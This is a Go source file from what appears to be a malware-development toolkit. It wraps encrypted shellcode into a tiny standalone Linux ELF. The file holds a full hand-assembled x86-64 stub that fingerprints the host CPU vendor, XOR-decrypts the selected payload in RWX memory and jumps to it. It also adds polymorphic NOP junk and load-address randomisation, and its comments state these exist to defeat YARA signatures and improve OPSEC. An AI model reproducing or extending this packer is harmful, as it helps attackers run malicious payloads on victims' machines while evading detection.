package packer

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	mathrand "math/rand"

	"github.com/oioio-space/maldev/pe/packer/transform"
)

// Bundle-as-executable: minimal stub asm + minimal ELF wrapper. The
// produced binary is a few hundred bytes total — no Go runtime, no
// dynamic linker, no on-disk plaintext for the matching payload until
// it gets XOR-decrypted into the stub's own page (which is RWX) at
// startup.
//
// This sits next to the higher-level `cmd/bundle-launcher` Go-runtime
// approach (~5 MB binary, full Go runtime + memfd+execve dispatch).
// The all-asm path trades operator ergonomics (no Negate flag in
// the asm evaluator yet) for binary size and OPSEC.

// intelNops are the Intel-recommended multi-byte NOP encodings (SDM
// Vol 2B, NOP §). Using these instead of N×0x90 means a yara writer
// can't pattern-match on long 0x90 runs to spot junk insertion.
//
// Each entry is one NOP of length [index+1]. The 9-byte version uses
// the maximum recommended single-NOP encoding.
var intelNops = [][]byte{
	{0x90},                                                       // 1: nop
	{0x66, 0x90},                                                 // 2: 66 nop
	{0x0f, 0x1f, 0x00},                                           // 3: nop dword [rax]
	{0x0f, 0x1f, 0x40, 0x00},                                     // 4: nop dword [rax+0]
	{0x0f, 0x1f, 0x44, 0x00, 0x00},                               // 5: nop dword [rax+rax+0]
	{0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00},                         // 6
	{0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00},                   // 7
	{0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00},             // 8
	{0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00},       // 9
}

// junkInsertOffset is the byte position WITHIN the stub bytes where
// the polymorphic junk gets inlined — between the PIC trampoline
// (call/pop/add r15, imm32 — 14 bytes) and the CPUID prologue.
//
// Why this slot is safe: every Jcc displacement in the stub is rel8
// relative to the end-of-Jcc address; both the source AND target of
// every Jcc live AFTER junkInsertOffset, so inserting N bytes shifts
// both by the same N — disp = (target+N) - (end-of-Jcc+N) is
// invariant. The PIC's `add r15, imm32` immediate is independently
// patched at wrap time to the new total stub length minus 5, so the
// junk simply lands inside the bundle-base computation.
const junkInsertOffset = 14

// injectStubJunk returns a copy of `stub` with a random number of
// Intel-recommended NOP bytes spliced in at [junkInsertOffset]. The
// total inserted byte count is in [4, 32) — enough to perturb yara
// signatures across packs without bloating the wrapped binary.
//
// `r` drives the choice of NOP sizes and the total length, so caller
// supplying the same seed gets the same junk (test determinism).
// Production callers in [WrapBundleAsExecutableLinuxWith] use
// crypto/rand for the seed so two packs of the same bundle produce
// distinct stub byte sequences.
func injectStubJunk(stub []byte, r *mathrand.Rand) []byte {
	if r == nil {
		return append([]byte(nil), stub...)
	}
	target := 4 + r.Intn(28) // [4, 32)
	junk := make([]byte, 0, target)
	for len(junk) < target {
		remaining := target - len(junk)
		maxSize := remaining
		if maxSize > len(intelNops) {
			maxSize = len(intelNops)
		}
		size := 1 + r.Intn(maxSize)
		junk = append(junk, intelNops[size-1]...)
	}
	out := make([]byte, 0, len(stub)+len(junk))
	out = append(out, stub[:junkInsertOffset]...)
	out = append(out, junk...)
	out = append(out, stub[junkInsertOffset:]...)
	return out
}

// bundleStubVendorAware returns stub bytes that walk the
// FingerprintEntry table and JMP into the first entry whose predicate
// either has PT_MATCH_ALL set OR has PT_CPUID_VENDOR set with a
// VendorString matching the host's CPUID-leaf-0 vendor (or all-zero
// wildcard). On no match, sys_exit_group(0).
//
// The stub composes:
//
//   - A CPUID prologue right after the PIC trampoline that reads the
//     12-byte host vendor onto the stack and pins the pointer in RSI.
//   - A per-entry vendor compare: if PT_CPUID_VENDOR is set, the entry's
//     12-byte VendorString gets compared (8 + 4 byte) against the host
//     vendor; an all-zero entry vendor is treated as a wildcard match.
//
// Per-entry asm (replacing the bare PT_MATCH_ALL test):
//
//	movzx r9d, byte [r8]              ; predType
//	test  r9b, 8                      ; PT_MATCH_ALL
//	jnz   .matched
//	test  r9b, 1                      ; PT_CPUID_VENDOR
//	jz    .next                       ; no recognised check → skip
//	mov   r10, [r8+4]
//	cmp   r10, [rsi]
//	jne   .vendor_zero_check
//	mov   r10d, [r8+12]
//	cmp   r10d, [rsi+8]
//	je    .matched
//	.vendor_zero_check:
//	mov   r10, [r8+4]
//	test  r10, r10
//	jnz   .next                       ; non-zero entry vendor + no match → fail
//	mov   r10d, [r8+12]
//	test  r10d, r10d
//	jz    .matched                    ; all-zero entry vendor → wildcard
//	.next:
//	add   r8, 48
//	inc   eax
//	jmp   .loop
//
// Total stub: ~160 bytes. Bundle binaries with two real-target entries
// land in the 450-550 B range — still under 1 KiB.
//
// Build-number predicates (PT_WIN_BUILD) are intentionally not wired
// in this Linux stub: the host-side hostWinBuild() returns 0 on
// Linux, so any PT_WIN_BUILD entry with non-zero BuildMin would fail
// regardless. A Windows minor (WrapBundleAsExecutableWindows) will
// add the PEB read + range compare alongside the minimal-PE writer.
func bundleStubVendorAware() []byte {
	return []byte{
		// === PIC trampoline ===                  offset 0
		// call .pic
		0xe8, 0x00, 0x00, 0x00, 0x00,
		// pop r15
		0x41, 0x5f,
		// add r15, imm32  (imm32 patched at wrap time, bytes 10..13)
		0x49, 0x81, 0xc7, 0x00, 0x00, 0x00, 0x00,
		// trampoline + add takes bytes 0..13 (14 bytes)

		// === CPUID prologue: read host vendor → 16-byte stack slot,
		//                     pin pointer in RSI ===
		// sub rsp, 16
		0x48, 0x83, 0xec, 0x10,
		// mov rdi, rsp
		0x48, 0x89, 0xe7,
		// xor eax, eax
		0x31, 0xc0,
		// cpuid
		0x0f, 0xa2,
		// mov [rdi], ebx
		0x89, 0x1f,
		// mov [rdi+4], edx
		0x89, 0x57, 0x04,
		// mov [rdi+8], ecx
		0x89, 0x4f, 0x08,
		// mov rsi, rdi          ; rsi = host vendor ptr, preserved
		0x48, 0x89, 0xfe,
		// CPUID prologue takes 22 bytes — ends at offset 36

		// === Loop setup ===                      offset 36
		// movzx ecx, word [r15+6]
		0x41, 0x0f, 0xb7, 0x4f, 0x06,
		// mov r8d, [r15+8]
		0x45, 0x8b, 0x47, 0x08,
		// add r8, r15
		0x4d, 0x01, 0xf8,
		// xor eax, eax
		0x31, 0xc0,
		// loop-setup takes 14 bytes — ends at offset 50

		// === Loop ===                            offset 50 = .loop
		// Final offset table (recomputed exhaustively, see comment block
		// after the array for the trace):
		//   .loop                = 50
		//   .vendor_zero_check   = 89
		//   .next                = 107
		//   .no_match            = 115
		//   .matched             = 124
		// All Jcc displacements below = (target − end-of-Jcc-instruction).
		//
		// cmp eax, ecx
		0x39, 0xc8,
		// jge .no_match  (115 − 54 = 61 = 0x3d)
		0x7d, 0x3d,
		// movzx r9d, byte [r8]
		0x45, 0x0f, 0xb6, 0x08,
		// test r9b, 8
		0x41, 0xf6, 0xc1, 0x08,
		// jnz .matched   (124 − 64 = 60 = 0x3c)
		0x75, 0x3c,
		// test r9b, 1
		0x41, 0xf6, 0xc1, 0x01,
		// jz .next       (107 − 70 = 37 = 0x25)
		0x74, 0x25,
		// mov r10, [r8+4]
		0x4d, 0x8b, 0x50, 0x04,
		// cmp r10, [rsi]
		0x4c, 0x3b, 0x16,
		// jne .vendor_zero_check  (89 − 79 = 10 = 0x0a)
		0x75, 0x0a,
		// mov r10d, [r8+12]
		0x45, 0x8b, 0x50, 0x0c,
		// cmp r10d, [rsi+8]
		0x44, 0x3b, 0x56, 0x08,
		// je .matched    (124 − 89 = 35 = 0x23)
		0x74, 0x23,

		// .vendor_zero_check:                     offset 89
		// mov r10, [r8+4]
		0x4d, 0x8b, 0x50, 0x04,
		// test r10, r10
		0x4d, 0x85, 0xd2,
		// jnz .next      (107 − 98 = 9 = 0x09)
		0x75, 0x09,
		// mov r10d, [r8+12]
		0x45, 0x8b, 0x50, 0x0c,
		// test r10d, r10d
		0x45, 0x85, 0xd2,
		// jz .matched    (124 − 107 = 17 = 0x11)
		0x74, 0x11,

		// .next:                                  offset 107
		// add r8, 48
		0x49, 0x83, 0xc0, 0x30,
		// inc eax
		0xff, 0xc0,
		// jmp .loop  (50 − 115 = −65 = 0xbf signed)
		0xeb, 0xbf,

		// === .no_match: Linux sys_exit_group(0) === offset 115
		// mov eax, 231
		0xb8, 0xe7, 0x00, 0x00, 0x00,
		// xor edi, edi
		0x31, 0xff,
		// syscall
		0x0f, 0x05,
		// no_match takes 9 bytes — ends at offset 124

		// === .matched: idx in eax → compute &PayloadEntry[eax] === offset 124
		// Offset trace (each line shows cumulative byte count):
		//   PIC trampoline       0  → 14
		//   CPUID prologue      14  → 36
		//   loop setup          36  → 50
		//   .loop body cmp+jge  50  → 54
		//   movzx + test r9b,8  54  → 62
		//   jnz .matched        62  → 64
		//   test r9b,1 + jz     64  → 70
		//   mov r10/cmp/jne     70  → 79
		//   mov r10d/cmp/je     79  → 89
		//   .vendor_zero_check  89  → 98
		//   second jnz/etc/jz   98  → 107
		//   .next: add/inc/jmp 107  → 115
		//   .no_match block    115  → 124
		//   .matched starts at 124
		//
		// .matched body:
		// mov r9d, [r15+12]
		0x45, 0x8b, 0x4f, 0x0c,
		// mov r10d, eax
		0x41, 0x89, 0xc2,
		// shl r10d, 5
		0x41, 0xc1, 0xe2, 0x05,
		// add r9d, r10d
		0x45, 0x01, 0xd1,
		// add r9, r15
		0x4d, 0x01, 0xf9,
		// mov rcx, r9
		0x4c, 0x89, 0xc9,
		// .matched body takes 19 bytes — ends at offset 144

		// === Decrypt+JMP tail (verbatim from prior stubs) ===
		// mov edi, [rcx]
		0x8b, 0x39,
		// add rdi, r15
		0x4c, 0x01, 0xff,
		// mov esi, [rcx+4]
		0x8b, 0x71, 0x04,
		// lea r8, [rcx+16]
		0x4c, 0x8d, 0x41, 0x10,
		// xor r9d, r9d
		0x45, 0x31, 0xc9,
		// .dec:
		// test esi, esi
		0x85, 0xf6,
		// jz .jmp_payload  (+0x1b)
		0x74, 0x1b,
		// mov al, [rdi]
		0x8a, 0x07,
		// mov dl, r9b
		0x44, 0x88, 0xca,
		// and dl, 15
		0x80, 0xe2, 0x0f,
		// movzx edx, dl
		0x0f, 0xb6, 0xd2,
		// xor al, [r8+rdx]
		0x41, 0x32, 0x04, 0x10,
		// mov [rdi], al
		0x88, 0x07,
		// inc rdi
		0x48, 0xff, 0xc7,
		// inc r9d
		0x41, 0xff, 0xc1,
		// dec esi
		0xff, 0xce,
		// jmp .dec  (-0x1f)
		0xeb, 0xe1,
		// .jmp_payload:
		// mov edi, [rcx]
		0x8b, 0x39,
		// add rdi, r15
		0x4c, 0x01, 0xff,
		// jmp rdi
		0xff, 0xe7,
	}
}


// bundleOffsetImm32Pos is the byte offset of the patchable imm32
// inside the bundle stub bytes — i.e. the "BUNDLE_OFF"
// operand of `add r15, imm32`. Exposed so tests + the wrap helper
// agree on the layout.
const bundleOffsetImm32Pos = 10

// WrapBundleAsExecutableLinux composes a runnable Linux x86-64 ELF
// from a bundle blob. Layout:
//
//	[ELF Ehdr (64 B) | PT_LOAD Phdr (56 B) | stub asm (~160 B) | bundle blob]
//
// Steps:
//
//  1. Emit the vendor-aware stub (PIC trampoline + CPUID prologue +
//     fingerprint scan loop + per-entry vendor compare + XOR decrypt
//     + JMP to payload).
//  2. Splice random Intel multi-byte NOPs at slot A (between PIC and
//     CPUID prologue) for per-pack stub polymorphism — see
//     [injectStubJunk].
//  3. Patch the stub's `add r15, BUNDLE_OFF` immediate with the byte
//     distance from the .pic label (5 bytes into the stub) to the
//     bundle's first byte. Equivalent to `len(stub) - 5`.
//  4. Concatenate stub + bundle.
//  5. Wrap in [transform.BuildMinimalELF64WithVaddr], using
//     `profile.Vaddr` when set.
//
// The result is a self-contained ELF — no PT_INTERP, no DT_NEEDED, no
// imports. The kernel maps it RWX and jumps to entry; the stub
// resolves the bundle base via call/pop PIC, walks the
// FingerprintEntry table dispatching on PT_MATCH_ALL or
// PT_CPUID_VENDOR with a 12-byte CPUID compare (all-zero VendorString
// = wildcard), XOR-decrypts the matched payload's data in place, and
// JMPs to it. The decrypted bytes must therefore be raw
// position-independent shellcode (NOT a packed PE/ELF — those need
// the cmd/bundle-launcher reflective path).
//
// Today's gap: the asm evaluator does not honour the Negate flag yet
// (Go-side [SelectPayload] does); a future minor closes that.
// PT_WIN_BUILD is also Linux-stub-skipped since hostWinBuild=0 there.
func WrapBundleAsExecutableLinux(bundle []byte) ([]byte, error) {
	return WrapBundleAsExecutableLinuxWith(bundle, BundleProfile{})
}

// WrapBundleAsExecutableLinuxWith is the per-build-profile-aware
// variant of [WrapBundleAsExecutableLinux]. Validates the supplied
// bundle's magic against `profile.Magic` (canonical default when
// zero) before wrapping. The bundle stub asm itself reads only
// header offsets — count, fpTable, plTable — and is magic-agnostic,
// so per-build magic bytes pass through transparently.
//
// Polymorphism: each call splices a fresh batch of Intel multi-byte
// NOPs into the stub (between the PIC trampoline and the CPUID
// prologue) so two packs of the same bundle produce distinct stub
// byte sequences — yara writers cannot signature the 160-byte stub
// across packs. The seed is drawn from crypto/rand. For deterministic
// pack output (testing, reproducible builds) use
// [WrapBundleAsExecutableLinuxWithSeed].
func WrapBundleAsExecutableLinuxWith(bundle []byte, profile BundleProfile) ([]byte, error) {
	var seedBytes [8]byte
	if _, err := rand.Read(seedBytes[:]); err != nil {
		return nil, fmt.Errorf("packer: stub junk seed: %w", err)
	}
	seed := int64(binary.LittleEndian.Uint64(seedBytes[:]))
	return WrapBundleAsExecutableLinuxWithSeed(bundle, profile, seed)
}

// WrapBundleAsExecutableLinuxWithSeed is the deterministic variant
// of [WrapBundleAsExecutableLinuxWith]: same seed → same stub junk
// pattern → byte-identical wrapped output (modulo the random per-
// payload XOR keys, which the caller controls via
// BundleOptions.FixedKey upstream). Use seed=0 for the canonical
// junk-free shape.
func WrapBundleAsExecutableLinuxWithSeed(bundle []byte, profile BundleProfile, seed int64) ([]byte, error) {
	if len(bundle) < BundleHeaderSize {
		return nil, fmt.Errorf("%w: %d < BundleHeaderSize %d",
			ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	expected := resolvedMagic(profile)
	if magic := binary.LittleEndian.Uint32(bundle[0:4]); magic != expected {
		return nil, fmt.Errorf("%w: %#x != %#x",
			ErrBundleBadMagic, magic, expected)
	}

	// Use the vendor-aware scan stub: walks the FingerprintEntry table,
	// matches entries by PT_MATCH_ALL bit OR PT_CPUID_VENDOR with a
	// 12-byte host CPUID compare (all-zero VendorString = wildcard).
	// On no match, exit_group(0). PT_WIN_BUILD is intentionally not
	// wired in this Linux stub (host build = 0); a future
	// WrapBundleAsExecutableWindows minor will add the PEB read.
	stub := bundleStubVendorAware()
	// Polymorphic junk insertion at slot A (after PIC trampoline,
	// before CPUID prologue). All Jcc displacements are AFTER this
	// slot, so they remain valid; the PIC's bundleOff immediate is
	// recomputed below from the new total stub length.
	if seed != 0 {
		rng := mathrand.New(mathrand.NewSource(seed))
		stub = injectStubJunk(stub, rng)
	}
	bundleOff := uint32(len(stub)) - 5 // distance from .pic label
	binary.LittleEndian.PutUint32(stub[bundleOffsetImm32Pos:], bundleOff)

	combined := make([]byte, 0, len(stub)+len(bundle))
	combined = append(combined, stub...)
	combined = append(combined, bundle...)

	// Per-build Vaddr (when set) randomises the canonical 0x400000
	// load address — yara'able as 'tiny ELF at standard ld base'.
	// Zero falls back to MinimalELF64Vaddr inside BuildMinimalELF64WithVaddr.
	return transform.BuildMinimalELF64WithVaddr(combined, profile.Vaddr)
}
